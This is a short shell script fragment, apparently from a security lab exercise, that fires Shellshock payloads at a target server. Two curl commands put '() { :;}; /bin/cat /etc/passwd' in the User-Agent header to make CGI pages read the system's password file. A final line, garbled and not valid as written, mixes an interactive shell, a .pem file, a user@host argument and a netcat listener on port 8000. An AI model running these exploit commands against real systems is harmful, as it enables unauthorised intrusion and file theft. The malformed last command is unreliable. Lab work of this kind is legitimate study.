...
sleep 2 
 ...
 curl -k -A "() { :;}; /bin/cat /etc/passwd" https://$theserver/cgi-bin/ss
sleep 2 
curl -k -A "() { :;}; /bin/cat /etc/passwd" https://$theserver/guestbook.html
sleep 2
sh -i ./server.pem softseclab@$theserver nc -l -p 8000 &
